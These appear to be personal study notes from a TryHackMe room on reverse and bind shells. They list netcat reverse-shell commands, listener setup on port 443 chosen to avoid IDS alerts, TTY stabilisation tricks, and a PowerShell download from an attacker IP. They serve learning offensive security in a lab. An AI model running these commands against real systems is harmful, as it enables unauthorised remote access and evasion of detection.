## Shells

**Reverse shell**

To avoid alerting IDS, the reverse shell should use a port that would not be suspected such as `443` (HTTPS).

--- https://tryhackme.com/room/introtoshells

* send us command line access to the server (a reverse shell)
* open up a port on the server which we can connect to in order to execute further commands (a bind shell). May be blocked by firewalls.
* xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip /u:u /p:pass
* **banner grabbing** (ncat/telnet)
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
* exploit/multi/handler
* /usr/share/webshells
* `nc ip port -e /bin/bash`
* In bind, the hacker is creating a server on the local machine.
* we can't run interactive command (requiring user input)
* `sudo rlwrap nc -lvnp 443`
* `python -c 'import pty;pty.spawn("/bin/bash")'`
* `export TERM=xterm` (give commands such as clear???)
* CTRL+Z then `stty raw -echo; fg`
* `reset` on finished
* sudo apt install rlwrap give us the basics aside the CTRL+C handler above
* Socat: transfer the socat binary https://github.com/andrew-d/static-binaries
* `Invoke-WebRequest -uri <LOCAL-IP>/file -outfile C:\\Windows\temp\file`
* Change terminal size
  * `stty -a` in another terminal to find the value you want
  * stty rows <number> / stty cols <number>
* `sudp python3 -m http.server 80`
* Maybe you could check out [penelope](https://github.com/brightio/penelope)
* https://github.com/0x00-0x00/ShellPop